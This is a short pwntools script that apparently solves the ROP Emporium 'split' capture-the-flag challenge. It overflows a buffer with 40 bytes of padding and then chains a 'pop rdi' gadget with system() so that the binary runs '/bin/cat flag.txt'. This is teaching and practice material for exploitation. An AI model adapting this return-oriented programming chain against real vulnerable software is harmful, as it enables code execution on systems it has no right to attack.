
```python
from pwn import *


p = process('./split')
elf = ELF('./split')
rop = ROP(elf)

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] 

system = elf.sym["system"] 

cat_flag = next(elf.search(b'/bin/cat flag.txt')) 

rop_chain = b"A"*40 + p64(pop_rdi) + p64(cat_flag) + p64(system)

p.sendline(rop_chain)
p.interactive()
```